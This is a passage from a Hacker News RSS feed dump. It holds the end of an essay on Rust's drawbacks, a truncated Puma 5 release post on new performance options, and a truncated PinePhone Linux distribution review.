<span>struct</span> <span>Foo</span>     <span>{</span> <span>bar</span><span>:</span> <span>Box</span><span>&lt;</span><span>Bar</span><span>&gt;</span>    <span>}</span>
<span>struct</span> <span>Foo</span>     <span>{</span> <span>bar</span><span>:</span> <span>Rc</span><span>&lt;</span><span>Bar</span><span>&gt;</span>     <span>}</span>
<span>struct</span> <span>Foo</span>     <span>{</span> <span>bar</span><span>:</span> <span>Arc</span><span>&lt;</span><span>Bar</span><span>&gt;</span>    <span>}</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>In Kotlin, you write <code>class Foo(val bar: Bar)</code>, and proceed with solving your business problem.
In Rust, there are choices to be made, some important enough to have dedicated syntax.</p>
<p>All this complexity is there for a reason — we don’t know how to create a simpler memory safe low-level language.
But not every task requires a low-level language to solve it.</p>

</div>
</div>
</dd>
<dt>Compile Times</dt>
<dd>
<div>
<div>
<p>Compile times are a multiplier for everything.
A program written in a slower to run but faster to compile programming language can be <em>faster</em> to run because the programmer will have more time to optimize!</p>
<p>Rust intentionally picked slow compilers in the <a href="https://research.swtch.com/generic">generics dilemma</a>.
This is not necessary the end of the world (the resulting runtime performance improvements are real), but it does mean that you’ll have to fight tooth and nail for reasonable build times in larger projects.</p>
<p><code>rustc</code> implements what is probably the most advanced <a href="https://rustc-dev-guide.rust-lang.org/queries/incremental-compilation.html">incremental compilation</a> algorithm in production compilers, but this feels a bit like fighting with language compilation model.</p>
<p>Unlike C++, Rust build is not embarrassingly parallel; the amount of parallelism is limited by length of the critical path in the dependency graph.
If you have 40+ cores to compile, this shows.</p>
<p>Rust also lacks an analog for the <a href="https://en.cppreference.com/w/cpp/language/pimpl">pimpl</a> idiom, which means that changing a crate requires recompiling (and not just relinking) all of its reverse dependencies.</p>
</div>
</div>
</dd>
<dt>Maturity</dt>
<dd>
<div>
<div>
<p>Five years old, Rust is definitely a young language.
Even though its future looks bright, I will bet more money on “C will be around in ten years” than on “Rust will be around in ten years”
(See <a href="https://en.wikipedia.org/wiki/Lindy_effect">Lindy Effect</a>).
If you are writing software to last decades, you should seriously consider risks associated with picking new technologies.
(But keep in mind that picking Java over Cobol for banking software in 90s retrospectively turned out to be the right choice).</p>
<p>There’s only one complete implementation of Rust — the <a href="https://github.com/rust-lang/rust/"><code>rustc</code></a> compiler.
The most advanced alternative implementation, <a href="https://github.com/thepowersgang/mrustc"><code>mrustc</code></a>, purposefully omits many static safety checks.
<code>rustc</code> at the moment supports only a single production-ready backend — LLVM.
Hence, its support for CPU architectures is narrower than that of C, which has GCC implementation as well as a number of vendor specific proprietary compilers.</p>
<p>Finally, Rust lacks an official specification.
<a href="https://doc.rust-lang.org/reference/">The reference</a> is a work in progress, and does not yet document all the fine implementation details.</p>
</div>
</div>
</dd>
<dt>Alternatives</dt>
<dd>
<div>
<div>
<p>There are other languages besides Rust in systems programming space, notably, C, C++, and Ada.</p>
<p>Modern C++ provides <a href="https://www.viva64.com/en/pvs-studio/">tools</a> and <a href="https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines">guidelines</a> for improving safety.
There’s even a proposal for a Rust-like <a href="https://github.com/isocpp/CppCoreGuidelines/blob/master/docs/Lifetime.pdf">lifetimes</a> mechanism!
Unlike Rust, using these tools does not <em>guarantee</em> the absence of memory safety issues.
However, if you already maintain a large body of C++ code, it makes sense to check if following best practices and using <a href="https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html">sanitizers</a> helps with security issues.
This is hard, but clearly is easier than rewriting in another language!</p>
<p>If you use C, you can use formal methods to <a href="https://sel4.systems/Info/FAQ/proof.pml">prove</a> the absence of undefined behaviors, or just <a href="https://sqlite.org/testing.html">exhaustively test</a> everything.</p>
<p>Ada is memory safe if you don’t use dynamic memory (never call <code>free</code>).</p>
<p>Rust is an interesting point on the cost/safety curve, but is far from the only one!</p>
</div>
</div>
</dd>
<dt>Tooling</dt>
<dd>
<div>
<div>
<p>Rust tooling is a bit of a hit and miss.
The baseline tooling, the compiler and the build system
(<a href="https://doc.rust-lang.org/cargo/index.html">cargo</a>), are often cited as best in class.</p>
<p>But, for example, some runtime-related tools (most notably, heap profiling) are just absent — it’s hard to reflect on the runtime of the program if there’s no runtime!
Additionally, while IDE support is decent, it is nowhere near the Java-level of reliability.
Automated complex refactors of multi-million line programs are not possible in Rust today.</p>
</div>
</div>
</dd>
<dt>Integration</dt>
<dd>
<div>
<div>
<p>Whatever the Rust promise is, it’s a fact of life that today’s systems programming world speaks C, and is inhabited by C and C++.
Rust intentionally doesn’t try to mimic these languages — it doesn’t use C++-style classes or C ABI.</p>
<p>That means that integration between the worlds needs explicit bridges.
These are not seamless.
They are <code>unsafe</code>, not always completely zero-cost and need to be synchronized between the languages.
While the general promise of <a href="http://adventures.michaelfbryan.com/posts/how-to-riir/">piece-wise integration</a> holds up and the <a href="https://github.com/dtolnay/cxx">tooling</a> catches up, there is accidental complexity along the way.</p>
<p>One specific gotcha is that Cargo’s opinionated world view (which <em>is</em> a blessing for pure Rust projects) might make it harder to integrate with a bigger build system.</p>
</div>
</div>
</dd>
<dt>Performance</dt>
<dd>
<div>
<div>
<p>“Using LLVM” is not a universal solution to all performance problems.
While I am not aware of benchmarks comparing performance of C++ and Rust at scale, it’s not to hard to come up with a list of cases where Rust leaves some performance on the table relative to C++.</p>
<p>The biggest one is probably the fact that Rust’s move semantics is based on values (<code>memcpy</code> at the machine code level).
In contrast, C++ semantics uses special references you can steal data from (pointers at the machine code level).
In theory, compiler should be able to see through chain of copies; in practice it often doesn’t: <a href="https://github.com/rust-lang/rust/issues/57077">#57077</a>.
A related problem is the absence of placement new — Rust sometimes need to copy bytes to/from the stack, while C++ can construct the thing in place.</p>
<p>Somewhat amusingly, Rust’s default ABI (which is not stable, to make it as efficient as possible) is sometimes worse than that of C: <a href="https://github.com/rust-lang/rust/issues/26494#issuecomment-619506345">#26494</a>.</p>
<p>Finally, while in theory Rust code should be more efficient due to the significantly richer aliasing information, enabling aliasing-related optimizations triggers LLVM bugs and miscompilations: <a href="https://github.com/rust-lang/rust/issues/54878">#54878</a>.</p>
<p>But, to reiterate, these are cherry-picked examples, sometimes the field is tilted the other way.
For example, <code>std::unique_ptr</code> <a href="https://www.youtube.com/watch?v=rHIkrotSwcc&amp;feature=youtu.be&amp;t=1261">has a performance problem</a> which Rust’s <code>Box</code> lacks.</p>
<p>A potentially bigger issue is that Rust, with its definition time checked generics, is less expressive than C++.
So, some C++ <a href="http://eigen.tuxfamily.org/index.php?title=Expression_templates">template tricks</a> for high performance are not expressible in Rust using a nice syntax.</p>
</div>
</div>
</dd>
<dt>Meaning of Unsafe</dt>
<dd>
<div>
<div>
<p>An idea which is even more core to Rust than ownership &amp; borrowing is perhaps that of <code>unsafe</code> boundary.
That, by delineating all dangerous operations behind <code>unsafe</code> blocks and functions and insisting on providing a safe higher-level interface to them, it is possible to create a system which is both</p>
<div>
<ol>
<li>
<p>sound (non-<code>unsafe</code> code can’t cause undefined behavior),</p>
</li>
<li>
<p>and modular (different <code>unsafe</code> blocks can be checked separately).</p>
</li>
</ol>
</div>
<p>It’s pretty clear that the promise works out in practice: <a href="https://github.com/rust-fuzz/trophy-case">fuzzing Rust code</a> unearths panics, not buffer overruns.</p>
<p>But the theoretical outlook is not as rosy.</p>
<p><em>First</em>, there’s no definition of Rust memory model, so it is impossible to formally check if a given unsafe block is valid or not.
There’s informal definition of “things rustc does or might rely on” and in in-progress <a href="https://github.com/rust-lang/miri">runtime verifier</a>, but the actual model is in flux.
So there might be some <code>unsafe</code> code somewhere which works OK in practice today, might be declared invalid tomorrow, and broken by a new compiler optimization next year.</p>
<p><em>Second</em>, there’s also an observation that <code>unsafe</code> blocks are not, in fact, modular.
Sufficiently powerful <code>unsafe</code> blocks can, in effect, extend the language.
Two such extensions might be fine in isolation, but lead to undefined behavior if used simultaneously:
<a href="https://smallcultfollowing.com/babysteps/blog/2016/10/02/observational-equivalence-and-unsafe-code/">Observational equivalence and unsafe code</a>.</p>

</div>
</div>
</dd>
</dl>
</div>
<p>Here are some thing I’ve deliberately omitted from the list:</p>
<div>
<ul>
<li>
<p>Economics (“it’s harder to hire Rust programmers”) — I feel that the “maturity” section captures the essence of it which is not reducible to chicken and egg problem.</p>
</li>
<li>
<p>Dependencies (“stdlib is too small / everything has too many deps”) — given how good Cargo and the relevant parts of the language are, I personally don’t see this as a problem.</p>
</li>
<li>
<p>Dynamic linking (“Rust should have stable ABI”) — I don’t think this is a strong argument. Monomorphization is pretty fundamentally incompatible with dynamic linking and there’s C ABI if you really need to. I do think that the situation here can be improved, <a href="https://internals.rust-lang.org/t/a-stable-modular-abi-for-rust/12347/10?u=matklad">but I don’t think that improvement needs to be Rust-specific</a>.</p>
</li>
</ul>
</div>

</article>

  </div></div>]]>
            </description>
            <link>https://matklad.github.io//2020/09/20/why-not-rust.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24539955</guid>
            <pubDate>Mon, 21 Sep 2020 04:58:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gitlab sped up Puma using sleep sort]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24539706">thread link</a>) | @eddietejeda
<br/>
September 20, 2020 | https://www.speedshop.co/2020/09/17/we-made-puma-faster-with-sleep-sort.html | <a href="https://web.archive.org/web/*/https://www.speedshop.co/2020/09/17/we-made-puma-faster-with-sleep-sort.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<article>



<p><b>Summary:</b> Puma 5 is a huge major release for the project. It brings several new experimental performance features, along with tons of bugfixes and features. Let's talk about some of the most important ones. <i>(1839 words / 7 minutes)</i>
</p>
<p>Puma 5 (codename Spoony Bard<sup>1</sup><span>(When Puma gets a new ‘supercontributor’ that submits lots of important work to the project, we let them name the next release. This release features a lot of code from Will Jordan, who named this release ‘Spoony Bard’. Will said: ‘Final Fantasy IV is especially nostalgic for me, the first big open-source project I ever worked on was a fan re-translation of the game back in the late 90s.’)</span><span><sup>1</sup> When Puma gets a new ‘supercontributor’ that submits lots of important work to the project, we let them name the next release. This release features a lot of code from Will Jordan, who named this release ‘Spoony Bard’. Will said: ‘Final Fantasy IV is especially nostalgic for me, the first big open-source project I ever worked on was a fan re-translation of the game back in the late 90s.’</span>) was released today (my birthday!). There’s a lot going on in this release, so I wanted to talk about the different features and changes to give Puma users confidence in upgrading.</p>
<h2 id="experimental-performance-features-for-cluster-mode-on-mri">Experimental Performance Features For Cluster Mode on MRI</h2>
<p>This is probably the headline of the release - two features for reducing memory usage, and one for reducing latency.</p>
<p>Puma 5 contains 3 new experimental performance features:</p>
<ul>
<li><code>wait_for_less_busy_worker</code> config. This may reduce latency on MRI through inserting a small delay (sleep sort!) before re-listening on the socket if worker is busy. Intended result: If enabled, should reduce latency in high-load (&gt;50% utilization) Puma clusters.</li>
<li><code>fork_worker</code> option and <code>refork</code> command for reduced memory usage by forking from a worker process instead of the master process. Intended result: If enabled, should reduce memory usage.</li>
<li>Added <code>nakayoshi_fork</code> config option. Reduce memory usage in preloaded cluster-mode apps by GCing before fork and compacting, where available. Intended result: If enabled, should reduce memory usage.</li>
</ul>
<p>All of these experiments are only for <strong>cluster mode</strong> Puma configs running on <strong>MRI</strong>.</p>
<p>We’re calling them <em>experimental</em> because we’re not sure if they’ll actually have any benefit. We’re pretty sure they’re stable and won’t break anything, but we’re not sure they’re actually going to have big benefits in the real world. People’s workloads are often not what we anticipate, and synthetic benchmarks are usually not of any help in figuring out if a change will be beneficial or not.</p>
<p>We do not believe any of the new features will have a negative effect or impact the stability of your application. This is either a “it works” or “it does nothing” experiment.</p>
<p>If any of the features turn out to be particularly beneficial, we may make them defaults in future versions of Puma.</p>
<p><strong>If you upgrade and try any of the 3 new features, please post before and after results or screenshots to <a href="https://github.com/puma/puma/issues/2258">this Github issue</a>.</strong> “It didn’t do anything” is still a useful report in this case. Posting ~24 hours of “before” and ~24 hours of “after” data would be most helpful.</p>
<h3 id="wait_for_less_busy_worker-sleep-sort-for-faster-apps">wait_for_less_busy_worker: sleep sort for faster apps?!</h3>
<p>This feature was contributed to Puma by Gitlab. Turn it on by adding <code>wait_for_less_busy_worker</code> to your Puma config.</p>
<p>When a request comes in to a Puma cluster, the operating system randomly selects a listening, free Puma worker process to pick up the request. “Listening” and “free” being the key words - a Puma process will only listen to the socket (and pick up more requests) if it has nothing else to do. However, when running Puma with multiple threads, Puma will also listen on the socket when all of its busy threads are waiting on I/O or have otherwise released <a href="https://www.speedshop.co/2020/09/17/2020/05/11/the-ruby-gvl-and-scaling.html">the Global VM Lock</a>.</p>
<p>When Gitlab investigated switching from Unicorn to Puma, they encountered an issue with this behavior. Under high load with moderate thread settings (a max pool size of 5 in their case), average request latency increased. Why?</p>
<p>Remember, I said that the operating system <em>randomly</em> assigns a request to a <em>listening</em> worker process. So, it will never send a request to a worker process that’s busy doing other things, but what about a worker process that’s got 4 threads that are processing other requests, but all 4 of those threads happen to be waiting on I/O right now?</p>
<p>Imagine a Puma cluster with 3 workers:</p>
<ul>
<li>Worker 1: 0/5 threads busy.</li>
<li>Worker 2: 1/5 threads busy.</li>
<li>Worker 3: 4/5 threads busy.</li>
</ul>
<p>If Worker 3’s 4 active threads happen to all have released the GVL, allowing that worker to listen to the socket, and a new request comes in - which worker process should we assign the request to, ideally? Worker 1, right? Unfortunately, most operating systems will assign the request to Worker 3 33% of the time.</p>
<p>So, what do we do? We want the operating system to prefer less-loaded workers. It would be really cool if we could sort the list of workers listening on the socket so that the operating system would give requests to the least-loaded worker. Well, we can’t really do that easily, but we can do something else.</p>
<p><code>wait_for_less_busy_worker</code> causes a worker to <em>wait</em> to re-listen on the socket if it’s thread pool isn’t completely empty. This means that in high-load scenarios, the operating system will assign requests to less-loaded workers.</p>
<p><strong>This is basically sleep-sorting our workers</strong>. We’re kind of doing doing this:</p>
<div><div><pre><code>[].tap { |a| workers.map { |e| Thread.new{ sleep worker_busyness.to_f/1000; a &lt;&lt; e} }.each{|t| t.join} }
</code></pre></div></div>
<p>… and hiding “more loaded” workers from the operating system by letting less-loaded workers listen first!</p>
<p>Originally the proposal was for a more complicated sort - processes slept longer if they had more busy threads - but that was removed when it was found that a simpler on/off sleep was just as effective.</p>
<p>The net effect is that in high-load scenarios, request latency decreases. This is because workers with more busy threads are slower than workers with no busy threads. We’re assuring that requests get assigned to the faster workers. Prior to this patch, Gitlab saw an increase in latency using Puma compared to Unicorn - after this patch, latency was the same (they also were able to reduce their fleet size by almost 30% thanks to Puma’s memory-saving multithreaded design).</p>
<p>There may be even more efficient ways for us to implement this behavior in the future. There’s some magic you can do with <code>libev</code>, I’m pretty sure, or we can just implement a different sleep/wait strategy.</p>
<h3 id="fork_worker">fork_worker</h3>
<p>Adding <code>fork_worker</code> to your puma.rb config file (or <code>--fork-worker</code> from the CLI) turns on this feature. This mode causes Puma to fork additional workers from worker 0, instead of directly from the master process:</p>
<div><div><pre><code>10000   \_ puma 5.0.0 (tcp://0.0.0.0:9292) [puma]
10001       \_ puma: cluster worker 0: 10000 [puma]
10002           \_ puma: cluster worker 1: 10000 [puma]
10003           \_ puma: cluster worker 2: 10000 [puma]
10004           \_ puma: cluster worker 3: 10000 [puma]
</code></pre></div></div>
<p>Similar to the <code>preload_app!</code> option, the <code>fork_worker</code> option allows your application to be initialized only once for copy-on-write memory savings, and it has two additional advantages:</p>
<ol>
<li><strong>Compatible with phased restart.</strong> Because the master process itself doesn’t preload the application, this mode works with phased restart (<code>SIGUSR1</code> or <code>pumactl phased-restart</code>), unlike <code>preload_app!</code>. When worker 0 reloads as part of a phased restart, it initializes a new copy of your application first, then the other workers reload by forking from this new worker already containing the new preloaded application.</li>
</ol>
<p>This allows a phased restart to complete as quickly as a hot restart (<code>SIGUSR2</code> or <code>pumactl restart</code>), while still minimizing downtime by staggering the restart across cluster workers.</p>
<ol>
<li><strong>‘Refork’ for additional copy-on-write improvements in running applications.</strong> Fork-worker mode introduces a new <code>refork</code> command that re-loads all nonzero workers by re-forking them from worker 0.</li>
</ol>
<p>This command can potentially improve memory utilization in large or complex applications that don’t fully pre-initialize on startup, because the re-forked workers can share copy-on-write memory with a worker that has been running for a while and serving requests.</p>
<p>You can trigger a refork by sending the cluster the <code>SIGURG</code> signal or running the <code>pumactl refork</code> command at any time. A refork will also automatically trigger once, after a certain number of requests have been processed by worker 0 (default 1000). To configure the number of requests before the auto-refork, pass a positive integer argument to <code>fork_worker</code> (e.g., <code>fork_worker 1000</code>), or <code>0</code> to disable.</p>
<h3 id="nakayoshi_fork">nakayoshi_fork</h3>
<p>Add <code>nakayoshi_fork</code> to your puma.rb config to try this option.</p>
<p>Nakayoshi means “friendly”, so this is a “friendly fork”. The concept was <a href="https://github.com/ko1/nakayoshi_fork">originally implemented by MRI supercontributor Koichi Sasada</a> in a gem, but we wanted to see if we could bring a simpler version into Puma.</p>
<p>Basically, we just do the following before forking a worker:</p>
<div><div><pre><code><span>4</span><span>.</span><span>times</span> <span>{</span> <span>GC</span><span>.</span><span>start</span> <span>}</span>
<span>GC</span><span>.</span><span>compact</span> <span># if available</span>
</code></pre></div></div>
<p>The concept here is that we’re trying to get as clean of a Ruby heap as possible before forking to maximize <a href="https://en.wikipedia.org/wiki/Copy-on-write">copy-on-write</a> benefits. That should, in turn, lead to reduced memory usage.</p>
<h2 id="other-new-features">Other New Features</h2>
<p>A few more things in the grab-bag:</p>
<ul>
<li>You can now compile Puma on machines where OpenSSL is not installed.</li>
<li>There is now a <code>thread-backtraces</code> command in pumactl to print all active threads backtraces. This has been available via SIGINFO on Darwin, but now it works on Linux via this new command.</li>
<li><code>Puma.stats</code> now has a <code>requests_count</code> counter.</li>
<li><code>lowlevel_error_handler</code> got some enhancements - we also pass the status code to it now.</li>
<li>Phased restarts and worker timeouts should be faster.</li>
<li><code>Puma.stats_hash</code> provides Puma statistics as a hash, rather than as JSON.</li>
</ul>
<h2 id="loads-of-bugfixes">Loads of Bugfixes</h2>
<p>The number of bugfixes in this release is pretty huge. Here’s the most important ones:</p>
<ul>
<li>Shutdowns should be more reliable.</li>
<li>Issues surrounding socket closing on shutdown have been resolved.</li>
<li>Fixed some concurrency …</li></ul></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.speedshop.co/2020/09/17/we-made-puma-faster-with-sleep-sort.html">https://www.speedshop.co/2020/09/17/we-made-puma-faster-with-sleep-sort.html</a></em></p>]]>
            </description>
            <link>https://www.speedshop.co/2020/09/17/we-made-puma-faster-with-sleep-sort.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24539706</guid>
            <pubDate>Mon, 21 Sep 2020 04:10:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Do Musical Scales Have Certain Numbers of Notes?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24539480">thread link</a>) | @lucaspauker
<br/>
September 20, 2020 | https://www.lucaspauker.ml/articles/16 | <a href="https://web.archive.org/web/*/https://www.lucaspauker.ml/articles/16">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.lucaspauker.ml/articles/16</link>
            <guid isPermaLink="false">hacker-news-small-sites-24539480</guid>
            <pubDate>Mon, 21 Sep 2020 03:24:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pinephone Postmarket OS CE Review]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24539466">thread link</a>) | @georgeoliver
<br/>
September 20, 2020 | https://portal.mozz.us/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini | <a href="https://web.archive.org/web/*/https://portal.mozz.us/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div><p><a href="https://portal.mozz.us/gemini/tanelorn.city/~vidak">Return to EPICURICS Index Page</a></p>

<p>
The version of the Pinephone that I am reviewing is the postmarketOS
Community Edition (CE).

</p>
<h2>First Impressions</h2>
<p>
My first impression of the Pinephone after I unboxed the device was
very good. I enjoyed the feeling of the weight of the Pinephone in my
hand, and the overall build quality of the system still impresses
me. It is my opinion that the PINE64 hardware development and
manufacturing process is very solid. For what I paid, which was about
AUD$200 all up, I believe I have received hardware that is superior
than a phone that I could have bought from a retail store in my city
for the same price.

The screen is glossy, and the capacitive touch screen (this is a
question fellow smolnet citizen Shufei wanted answered in some detail)
responds well.

I was, however, disappointed with the stock postmarketOS software that
came flashed on the eMMC. The Software Centre was a particular
disappointment. It, by default, only showed the currently installed
software, and it was not possible to browse any other software which
was not already installed.

Also, the camera application that came installed by default, 'Cheese',
did not allow the camera to function.

I attempted to install Plasma Mobile using the command line, following
these instructions:

</p>
<p><a href="https://wiki.postmarketos.org/wiki/Plasma_Mobile">https://wiki.postmarketos.org/wiki/Plasma_Mobile</a></p><p>
But it ended up completely wrecking the function of the
phone. Installing the package that the wiki article recommended did
not update LightDM, and I ended up soft-bricking the phone while
fiddling with the LightDM configuration in order to stop the phone
from (still) booting into phosh, and not Plasma Mobile.

It also disabled cell data functionality, and ended up messing with a
lot of the guts of the Linux installation. So I do not recommend
attempting to switch to Plasma Mobile on the Pinephone from inside an
already-existing postmarketOS installation. I recommend getting a
Plasma Mobile system image, and flashing that from the start if you
wish to experiment with different user interfaces.

</p>
<h2>Linux Software Distributions</h2>
<p>
There is a great many Linux distributions available for the
Pinephone. The following link to the PINE64 wiki contains a
more-or-less exhaustive list of each of them:

</p>
<p><a href="https://wiki.pine64.org/index.php/PinePhone_Software_Releases">https://wiki.pine64.org/index.php/PinePhone_Software_Releases</a></p><p>
The Linux distributions that I tested out are:

</p>
<h3>postmarketOS (phosh UI)</h3>
<p>
I enjoyed this system image because it came with a wizard for
NetworkManager which enabled me to make sure cell data worked most
consistently. However, the power consumption of this image was
prohibitively high, and it caused the phone to run very hot. When the
battery was at 10% charge, rebooting the phone would cause the last of
this precious charge to be used up, and the phone would run completely
out of power.

</p>
<h3>postmarketOS (GNOME)</h3>
<p>
This image was basically a desktop UI, and did not have many, if any
mobile UI configurations present. It was rather fun to see the
Pinephone boot into a full GNOME desktop environment. I imagine if you
had a bigger screen connected to the Pinephone, you would be quite
impressed with what this phone could pull off.

</p>
<h3>postmarketOS (Plasma Mobile)</h3>
<p>
Slow and buggy, really.

</p>
<h3>Ubuntu Touch</h3>
<p>
This distribution has a major problem at the moment: the unlock/power
button is not properly debounced, and it makes it virtually impossible
sometimes to unlock the phone. Otherwise, this distribution is very,
very impressive, and I would actually like to switch to it, because
cell data works best for Optus on Ubuntu Touch.

This distribution could indeed be a daily driver for someone if they
could sort out the button debouncing problem.

</p>
<h3>SailfishOS</h3>
<p>
This is a Linux-based operating system that uses a closed-source
UI. It was so glossy and locked-down in terms of configurability that
I was turned off using it. It has a great tutorial for teaching you
the gestures you need to learn in order to use the touch screen.

I did like the fact that it organised all your contacts and messages
into interesting metaphors, and it ran reasonably quickly, but there
is no way of configuring the UI beyond what how it arrives to you.

</p>
<h3>Manjaro ARM</h3>
<p>
This image was fairly slow to run on the Pinephone, but in my opinion
it is the absolute best demonstration of KDE Plasma Mobile. It was
very visually impressive, and the menus were full-featured and
informative. It did not, however, support phone calls or SMS.

</p>
<h3>Mobian</h3>
<p>
This is my current choice of Linux distribution for the phone. It has
a software centre full of different and interesting programs,
including Transmission (torrent client) and GIMP (!!! I have yet to
install this to see how or if it works well, but the fact that it is
possible to at least _run_ GIMP in some capacity on the Pinephone
would like like running Adobe Photoshop on a Samsung Galaxy).

This is merely anecdotal, and I have not performed any scientific
tests to work out if this is true, but the latest September 2020
stable release of this image seems to have the best power settings of
any of the other distributions for this phone.

I hesitate to give an estimate of exactly how long this phone will
last on a single charge, given normal use. But, I finished charging
this phone at 0700HRS this morning, and, with no other charge, it is now
on 50% charge, and the current time is 1230HRS. I think I have put the
phone through a little heavier use than I do normally, this morning,
however.

Virtually all of the functions of the phone are enabled without any
configuration in Mobian.

</p>
<h3>Multi-boot Image</h3>
<p>
I highly recommend flashing the following system image to an SD card
so you can try out all the major Linux distributions for your phone:

</p>
<p><a href="https://xnux.eu/p-boot-demo/">https://xnux.eu/p-boot-demo/</a></p><p>
It contains 13 different distributions, and it is trivial to switch
between each of them through the main boot menu.

</p>
<h2>Mobile Phone Calls</h2>
<p>
I have rung a few people on the phone, and, assuming you have a
distribution flashed on the phone that supports phonecalls (like the
one I am currently using, Mobian), there should be absolutely no issue
using this fundamental feature of the Pinephone.

</p>
<h2>Cell Data</h2>
<p>
For the most part, the cell data modem in the Pinephone works well for
me. There is a fairly large problem with my use of the Pinephone with
its cell data, however.

I live in Australia, and the mobile phone carrier that I use is
Optus. The setup(s) that work for me with my Pinephone, running
Mobian, is:

</p>
<blockquote> Name: 1
 APN: yesinternet</blockquote>

<blockquote> Name: Optus Yes Internet
 APN: yesinternet</blockquote>
<p>
After about 3 or 4 hours after I boot up the phone, the cell data
stops working, and the Network Mode in the 'Mobile' submenu of
Settings changes from

</p>
<blockquote> 2G, 3G, 4G (Preferred)</blockquote>
<p>
to just

</p>
<blockquote> 2G, 3G, 4G</blockquote>
<p>
This issue is fixed for another 3 or 4 hours by rebooting the phone,
which does not actually take that long (about 10 to 15 seconds), but
it is a hassle to be cut off from mobile data if you forget about your
phone.

These two links help shed light on exactly what is happening with the
Pinephone when it tries to remain connected to the Optus network:

</p>
<p><a href="https://forum.gl-inet.com/t/using-rooter-on-the-gl-x750/8983/4">https://forum.gl-inet.com/t/using-rooter-on-the-gl-x750/8983/4</a></p><p>
(A forum post. Someone using a similar, if not identical mobile data
modem as the Pinephone in Australia, with the Optus network)

</p>
<p><a href="https://gist.github.com/Juul/e42c5b6ec71ce11923526b36d3f1cb2c">https://gist.github.com/Juul/e42c5b6ec71ce11923526b36d3f1cb2c</a></p><p>
(A Github post which familiarises the reader with the concepts and
command line tools involved in using Linux with 4G LTE modems on
Debian and Ubuntu)

The issue with the Pinephone is explained the forum thread (the first
link). The issue is that there are at least two modes for the Quectel
EG25 modem that the Pinephone uses, only one of which seems to be
supported by Optus. The two modes are QMI and MBIM. Optus, I assume,
only supoprts MBIM:

https://forum.gl-inet.com/t/using-rooter-on-the-gl-x750/8983/8 Forum post

The relevant sentence from the above forum post is:

</p>
<blockquote> Also, MBIM is buggy for Quectel modems even in OpenWRT 19.07
 (snapshot), mostly sometimes modem “freezes” and I need to restart.</blockquote>
<p>
The issue that the original poster was having with this modem is
explained in the same post:

</p>
<blockquote> The reason is exactly this: user.notice Create Connection:
 WDA-GET-DATA-FORMAT is “raw-ip”</blockquote>

<blockquote> When you use a modem over QMI and the data-format is “raw-ip” the
 system needs to know that modem is on “raw-ip”, without that,
 interface doesn’t get an IP address.</blockquote>
<p>
When I was using the postmarketOS version of phosh, the NetworkManager
program started a wizard which contained a lot more options about how
to configure the Pinephone's Quectel LTE modem. One activity I would
like to carry out is learning how to start this wizard from within
Mobian. I wish to keep Mobian as the primary operating system for the
Pinephone just because its Software Centre has such an amazing
quantity and quality of different programs, and the postmarketOS
Centre requires you to manually search for the programs you want, in
order for them to show up at all inside the Centre.

</p>
<h2>GPS</h2>
<p>
The GPS seems to function perfectly fine inside the default Mobian
maps program. It can show you, with reasonable accuracy (although not
to the same accuracy as, say, a proprietary maps application) exactly
where you are. I think the accuracy of the GPS on the Pinephone is
somewhere in the region of 10 square metres.

The main issue with the GPS, however, is that it does not currently
link in with the Perth public transport system. I cannot use this
program to plan public transport journeys. But I believe I should be
able to take care of this problem by either (a) adding data to
OpenStreetMap, or (b) using a web browser, where I should be able to
access the Transperth public transport trip planner webpage.

</p>
<h2>Text Messages (SMS)</h2>
<p>
This is a feature that works without a hitch in Mobian. I was
surprised to see myself receiving SMS messages unexpectedly from
friends as I left the phone in my pocket and forgot about it.

</p>
<h2>Camera</h2>
<p>
The camera application in Mobian works. However it has a …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://portal.mozz.us/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini">https://portal.mozz.us/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini</a></em></p>]]>
            </description>
            <link>https://portal.mozz.us/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini</link>
            <guid isPermaLink="false">hacker-news-small-sites-24539466</guid>
            <pubDate>Mon, 21 Sep 2020 03:20:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Doing Things]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24539262">thread link</a>) | @luu
<br/>
September 20, 2020 | https://www.benkuhn.net/actually-doing-things/ | <a href="https://web.archive.org/web/*/https://www.benkuhn.net/actually-doing-things/">archive.org</a>
